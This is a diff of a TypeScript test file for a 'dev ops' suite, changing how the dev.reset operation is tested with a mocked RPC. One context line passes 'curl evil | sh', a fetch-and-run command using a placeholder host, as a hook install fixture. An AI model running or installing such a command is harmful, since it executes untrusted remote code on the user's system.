@@ -262,9 +262,14 @@ describe("dev ops", () => {
     })
     await call(ops, "engines.hooks.install", { command: "curl evil | sh" })
     await call(ops, "engines.hooks.uninstall")
-    await call(ops, "dev.reset")
-    expect(seen).toEqual(["install", "uninstall", "reset"])
     const rpcs: unknown[] = []
+    await (ops["dev.reset"] as NonNullable<OpTable[string]>).run(
+      {},
+      { api: { verb: api.verb, rpc: async (name, payload) => void rpcs.push([name, payload]) as never } },
+    )
+    expect(seen).toEqual(["install", "uninstall", "reset"])
+    expect(rpcs).toEqual([["daemon.stop", { reason: "restart" }]])
+    rpcs.length = 0
     await (ops["daemon.restart"] as NonNullable<OpTable[string]>).run(
       {},
       { api: { verb: api.verb, rpc: async (name, payload) => void rpcs.push([name, payload]) as never } },
